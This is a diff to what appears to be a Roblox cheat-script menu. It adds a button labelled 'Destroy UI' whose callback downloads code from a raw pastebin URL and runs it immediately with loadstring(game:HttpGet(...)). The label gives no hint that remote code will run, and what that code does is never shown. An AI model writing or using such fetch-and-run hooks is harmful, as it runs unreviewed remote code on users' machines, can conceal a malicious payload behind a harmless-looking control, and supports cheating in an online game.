@@ -303,6 +303,14 @@ end)
 })
 
 MainTab:AddButton({
+	Name = "Destroy UI",
+	Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Hy9zubkR"))()
+  	end    
+})
+
+
+MainTab:AddButton({
 	Name = "Rizz script",
 	Callback = function()
         function Chat(message)
